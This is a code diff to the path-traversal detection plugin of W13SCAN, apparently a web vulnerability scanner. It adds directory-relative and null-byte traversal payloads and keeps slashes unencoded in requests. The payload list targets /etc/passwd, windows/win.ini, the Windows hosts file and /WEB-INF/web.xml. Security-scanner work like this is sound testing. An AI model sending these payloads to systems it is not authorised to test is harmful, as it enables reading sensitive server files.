@@ -6,7 +6,7 @@
 import copy
 import os
 import re
-from urllib.parse import unquote
+from urllib.parse import unquote, urlencode
 
 import requests
 
@@ -70,19 +70,30 @@ class W13SCAN(PluginBase):
                 if ("." in v or "/" in v) or (k.lower() in ['filename', 'file', 'path', 'filepath']):
                     default_extension = 'jpg'
                     exi = os.path.splitext(v)[1]
+                    origin = False
+                    dirname = ''
+                    if exi != "":
+                        origin = True
+                        dirname = os.path.dirname(v)
                     if "." in exi:
                         default_extension = exi[1:]
                     data = copy.deepcopy(params)
                     payloads = []
+
                     if 1 >= isunix >= 0:
                         payloads.append("../../../../../../../../../../etc/passwd")
                         payloads.append("/etc/passwd")
-                        payloads.append(v + "/../../../../../../../../../../etc/passwd")
+                        if origin:
+                            payloads.append(dirname + "/../../../../../../../../../../etc/passwd")
+                            payloads.append(dirname + "/../../../../../../../../../../etc/passwd{}".format(
+                                unquote("%00") + default_extension))
                         payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")))
                         payloads.append(
                             "../../../../../../../../../../etc/passwd{}".format(unquote("%00")) + default_extension)
                     if 1 >= iswin >= 0:
                         payloads.append("../../../../../../../../../../windows/win.ini")
+                        if origin:
+                            payloads.append(dirname + "/../../../../../../../../../../windows/win.ini")
                         payloads.append("C:\\WINDOWS\\system32\\drivers\\etc\\hosts")
                     if 1 >= isjava >= 0:
                         payloads.append("/WEB-INF/web.xml")
@@ -92,7 +103,7 @@ class W13SCAN(PluginBase):
 
                     for payload in payloads:
                         data[k] = payload
-                        r = requests.get(netloc, params=data, headers=headers)
+                        r = requests.get(netloc, params=urlencode(data, safe='/'), headers=headers)
                         for i in plainArray:
                             if i in r.text:
                                 out.success(url, self.name, payload="{}:{}".format(k, data[k]), raw=r.raw)
